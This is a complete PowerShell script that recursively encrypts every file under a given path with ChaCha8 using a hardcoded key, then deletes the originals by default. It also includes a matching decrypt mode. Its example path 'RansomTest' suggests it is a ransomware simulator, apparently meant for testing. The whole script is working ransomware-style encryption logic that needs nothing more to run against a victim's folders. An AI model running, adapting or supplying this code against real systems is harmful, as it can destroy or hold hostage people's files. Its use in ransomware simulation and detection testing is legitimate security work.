<#
.SYNOPSIS
    Recursively encrypts or decrypts files using ChaCha8 via BouncyCastle.

.DESCRIPTION
    - ChaCha8 (8 rounds) with a hardcoded 256-bit (32-byte) key.
    - Random 8-byte nonce per file, stored as a prefix of the encrypted
      file (first 8 bytes of the .enc file).
    - Encryption is recursive when a directory is provided.
    - Decryption expects .enc files and restores the original name by
      stripping that extension.
    - Original files are REMOVED by default after processing.
      Use -KeepSource to preserve them.

.PARAMETER Method
    Encrypt or Decrypt.

.PARAMETER Path
    Path to a file or directory. If a directory, it is processed recursively.

.PARAMETER KeepSource
    If set, the original file is kept after processing.

.EXAMPLE
    .\ChaCha8.ps1 -Method Encrypt -Path "C:\Users\Public\RansomTest"
    .\ChaCha8.ps1 -Method Decrypt -Path "C:\Users\Public\RansomTest"

.NOTES
    Requires BouncyCastle.Crypto.dll.
    ChaCha8 is weaker than ChaCha20; use it only if you know what you're doing.
#>

param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Encrypt", "Decrypt")]
    [string]$Method,

    [Parameter(Mandatory = $true)]
    [string]$Path,

    # Extension for encrypted files
    [string]$EncExtension = ".enc",

    # If set, keep the source file after processing. By default the source
    # (original file on encrypt, .enc on decrypt) is deleted.
    [switch]$KeepSource
)

# ============================================================
# CONFIGURATION
# ============================================================

# Path to the BouncyCastle DLL. ADJUST THIS PATH.
$BouncyCastlePath = "C:\Users\Public\BouncyCastle.Crypto.dll"

# Hardcoded 32-byte (256-bit) key.
# ChaCha8 requires a 256-bit key. 32 bits is neither valid nor secure.
[byte[]]$Key = @(
    0x2D, 0x8F, 0x1A, 0xC4, 0x7B, 0x3E, 0x90, 0x56,
    0xD2, 0x0F, 0xAB, 0x73, 0xE5, 0x48, 0x9C, 0x21,
    0x6B, 0xF0, 0x34, 0x8D, 0x52, 0xA7, 0x1E, 0xC9,
    0x78, 0x03, 0xBE, 0x4F, 0x61, 0xDA, 0x95, 0x3C
)

# BouncyCastle's ChaChaEngine (original Bernstein variant) requires an 8-byte nonce.
$NonceSize = 8

# Number of rounds: 8 = ChaCha8, 20 = ChaCha20
$Rounds = 8

# ============================================================
# LOAD BOUNCYCASTLE
# ============================================================
if (-not ("Org.BouncyCastle.Crypto.Engines.ChaChaEngine" -as [type])) {
    try {
        Add-Type -Path $BouncyCastlePath -ErrorAction Stop
    } catch {
        Write-Error "Could not load BouncyCastle from '$BouncyCastlePath': $_"
        exit 1
    }
}

# ============================================================
# FUNCTIONS
# ============================================================

function Invoke-ChaCha8 {
    <#
        Processes bytes with ChaCha8 using BouncyCastle.
        ChaCha is a stream cipher: the same operation is used for
        both encryption and decryption.
    #>
    param(
        [Parameter(Mandatory = $true)][byte[]]$Data,
        [Parameter(Mandatory = $true)][byte[]]$Key,
        [Parameter(Mandatory = $true)][byte[]]$Nonce
    )

    if ($Nonce.Length -ne $NonceSize) {
        throw "Nonce must be exactly $NonceSize bytes (received: $($Nonce.Length))."
    }
    if ($Key.Length -ne 32) {
        throw "Key must be exactly 32 bytes (received: $($Key.Length))."
    }

    $engine = New-Object Org.BouncyCastle.Crypto.Engines.ChaChaEngine -ArgumentList $Rounds

    $keyParam = New-Object Org.BouncyCastle.Crypto.Parameters.KeyParameter -ArgumentList (, $Key)
    $params   = New-Object Org.BouncyCastle.Crypto.Parameters.ParametersWithIV -ArgumentList ($keyParam, $Nonce)

    # forEncryption = true; irrelevant for stream ciphers since it's just XOR
    $engine.Init($true, $params)

    $output = New-Object byte[] $Data.Length
    $engine.ProcessBytes($Data, 0, $Data.Length, $output, 0)
    return ,$output
}

function Get-TargetFiles {
    param(
        [Parameter(Mandatory = $true)][string]$Root,
        [Parameter(Mandatory = $true)][string]$Method,
        [Parameter(Mandatory = $true)][string]$Ext
    )

    if (Test-Path -LiteralPath $Root -PathType Container) {
        $files = Get-ChildItem -LiteralPath $Root -Recurse -File
    }
    elseif (Test-Path -LiteralPath $Root -PathType Leaf) {
        $files = @(Get-Item -LiteralPath $Root)
    }
    else {
        throw "Path '$Root' does not exist."
    }

    if ($Method -eq "Encrypt") {
        # When encrypting, skip files that are already encrypted.
        return $files | Where-Object { $_.Extension -ne $Ext }
    }
    else {
        # When decrypting, only process .enc files.
        return $files | Where-Object { $_.Extension -eq $Ext }
    }
}

function New-RandomNonce {
    param([int]$Size)
    $bytes = New-Object byte[] $Size
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    try {
        $rng.GetBytes($bytes)
    } finally {
        $rng.Dispose()
    }
    return ,$bytes
}

# ============================================================
# MAIN PROCESS
# ============================================================

try {
    $files = Get-TargetFiles -Root $Path -Method $Method -Ext $EncExtension
} catch {
    Write-Error $_
    exit 1
}

if (-not $files -or @($files).Count -eq 0) {
    Write-Host "No files to process in '$Path'."
    exit 0
}

$files = @($files)
Write-Host "Processing $($files.Count) file(s) with ChaCha$Rounds.`n"

foreach ($file in $files) {
    try {
        if ($Method -eq "Encrypt") {
            # 1) Generate a random nonce per file
            $nonce = New-RandomNonce -Size $NonceSize

            # 2) Read the original content
            $plain = [System.IO.File]::ReadAllBytes($file.FullName)

            # 3) Encrypt with ChaCha8
            $cipher = Invoke-ChaCha8 -Data $plain -Key $Key -Nonce $nonce

            # 4) Write: [nonce(8)] + [ciphertext]
            $destination = "$($file.FullName)$EncExtension"
            $outStream = [System.IO.File]::Create($destination)
            try {
                $outStream.Write($nonce, 0, $nonce.Length)
                $outStream.Write($cipher, 0, $cipher.Length)
            } finally {
                $outStream.Dispose()
            }

            Write-Host "[ENCRYPTED] $($file.FullName) -> $destination"

            # 5) Delete the original unless -KeepSource was specified
            if (-not $KeepSource) {
                Remove-Item -LiteralPath $file.FullName -Force
            }
        }
        else {
            # 1) Read the full encrypted file
            $blob = [System.IO.File]::ReadAllBytes($file.FullName)
            if ($blob.Length -lt $NonceSize) {
                throw "Encrypted file too short to contain a nonce."
            }

            # 2) Split nonce and ciphertext
            $nonce = New-Object byte[] $NonceSize
            [Array]::Copy($blob, 0, $nonce, 0, $NonceSize)

            $cipherLength = $blob.Length - $NonceSize
            $cipher = New-Object byte[] $cipherLength
            [Array]::Copy($blob, $NonceSize, $cipher, 0, $cipherLength)

            # 3) Decrypt (same ChaCha8)
            $plain = Invoke-ChaCha8 -Data $cipher -Key $Key -Nonce $nonce

            # 4) Restore the original filename by stripping the .enc extension
            if ($file.FullName.EndsWith($EncExtension)) {
                $destination = $file.FullName.Substring(
                    0, $file.FullName.Length - $EncExtension.Length
                )
            } else {
                $destination = "$($file.FullName).dec"
            }

            [System.IO.File]::WriteAllBytes($destination, $plain)
            Write-Host "[DECRYPTED] $($file.FullName) -> $destination"

            # 5) Delete the .enc unless -KeepSource was specified
            if (-not $KeepSource) {
                Remove-Item -LiteralPath $file.FullName -Force
            }
        }
    }
    catch {
        Write-Warning "Error processing '$($file.FullName)': $_"
    }
}

Write-Host "`n[+] The process completed sucessfully"
